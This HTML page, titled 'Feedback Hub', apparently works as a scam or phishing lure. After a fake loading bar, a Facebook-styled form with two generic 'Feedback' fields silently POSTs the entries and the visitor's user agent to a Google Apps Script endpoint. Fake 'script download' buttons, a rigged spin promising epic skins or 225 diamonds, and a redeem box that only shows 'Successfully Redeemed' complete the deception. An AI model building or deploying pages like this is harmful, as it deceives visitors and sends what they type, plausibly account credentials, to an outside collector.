<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Feedback Hub</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:Helvetica,Arial,sans-serif;
  background:radial-gradient(circle at top,#6a35c9,#0b0016);
  color:#fff;
}

/* LOADING */
#loading{
  position:fixed;inset:0;
  display:flex;flex-direction:column;
  justify-content:center;align-items:center;
}
#bar{
  width:80%;height:8px;
  background:rgba(255,255,255,.2);
  border-radius:10px;overflow:hidden;
}
#bar span{
  display:block;height:100%;
  width:0%;
  background:#3fa9ff;
  transition:.1s;
}

/* CARD */
.card{
  width:94%;max-width:360px;
  margin:40px auto;
  background:rgba(255,255,255,.08);
  backdrop-filter:blur(16px);
  border-radius:18px;
  padding:18px;
  box-shadow:0 0 40px rgba(100,0,255,.4);
}

.hidden{display:none}

/* FACEBOOK-LIKE FEEDBACK STYLE */
.fb-title{
  font-size:22px;
  font-weight:700;
  text-align:center;
  margin-bottom:4px;
}
.fb-sub{
  text-align:center;
  font-size:13px;
  opacity:.8;
  margin-bottom:14px;
}
input{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:none;
  margin-bottom:10px;
  outline:none;
}
button{
  width:100%;
  padding:12px;
  border:none;
  border-radius:12px;
  background:#3fa9ff;
  color:#fff;
  font-weight:700;
}

/* NAV */
.nav{
  display:flex;
  justify-content:space-around;
  margin-bottom:14px;
  font-size:13px;
}
.nav div{opacity:.6}
.nav .active{opacity:1;font-weight:700}

/* SPIN */
#wheel{
  width:220px;height:220px;
  border-radius:50%;
  border:6px solid #3fa9ff;
  margin:20px auto;
  display:flex;align-items:center;justify-content:center;
  font-size:40px;
}
</style>
</head>

<body>

<!-- LOADING -->
<div id="loading">
  <h3>Loading <span id="percent">1%</span></h3>
  <div id="bar"><span></span></div>
</div>

<!-- FEEDBACK -->
<div id="feedback" class="card hidden">
  <div class="fb-title">FEEDBACK</div>
  <div class="fb-sub">Help us improve</div>

  <input id="f1" placeholder="Feedback 1">
  <input id="f2" placeholder="Feedback 2">
  <button onclick="submitFeedback()">Submit Feedback</button>
</div>

<!-- MAIN -->
<div id="main" class="card hidden">

  <div class="nav">
    <div onclick="showTab('download')" class="active">SCRIPT DOWNLOAD</div>
    <div onclick="showTab('spin')">SPIN</div>
    <div onclick="showTab('redeem')">REDEEM</div>
  </div>

  <!-- DOWNLOAD -->
  <div id="download">
    <button>DOWNLOAD</button><br><br>
    <button>DOWNLOAD</button><br><br>
    <button>DOWNLOAD</button>
  </div>

  <!-- SPIN -->
  <div id="spin" class="hidden">
    <p style="text-align:center">CHANCE TO GET EPIC SKIN OR DIAMOND</p>
    <div id="wheel">üéÅ</div>
    <button onclick="spin()">SPIN</button>
  </div>

  <!-- REDEEM -->
  <div id="redeem" class="hidden">
    <h3>üíé225</h3>
    <input placeholder="Enter text">
    <input placeholder="Enter text">
    <button onclick="alert('Successfully Redeemed')">Redeem</button>
  </div>

</div>

<script>
/* LOADING */
let p=0;
let load=setInterval(()=>{
  p++;
  percent.innerText=p+"%";
  document.querySelector("#bar span").style.width=p+"%";
  if(p>=100){
    clearInterval(load);
    loading.classList.add("hidden");
    feedback.classList.remove("hidden");
  }
},100);

/* FEEDBACK */
function submitFeedback(){
  const data={
    time:new Date().toLocaleString(),
    f1:f1.value,
    f2:f2.value,
    device:navigator.userAgent,
    location:"N/A"
  };

  fetch("https://script.google.com/macros/s/AKfycbxE-8YQziDsrweH5FHWCWx-lYwh7bX-Mz7v_1BOxbWz5hoNRy-idSJybjdRMLPvJZ1Vcw/exec",{
    method:"POST",
    body:JSON.stringify(data)
  });

  feedback.classList.add("hidden");
  main.classList.remove("hidden");
}

/* NAV */
function showTab(tab){
  document.querySelectorAll("#download,#spin,#redeem").forEach(d=>d.classList.add("hidden"));
  document.getElementById(tab).classList.remove("hidden");
}

/* SPIN */
function spin(){
  alert("You got üíé225");
  showTab("redeem");
}
</script>

</body>
</html>
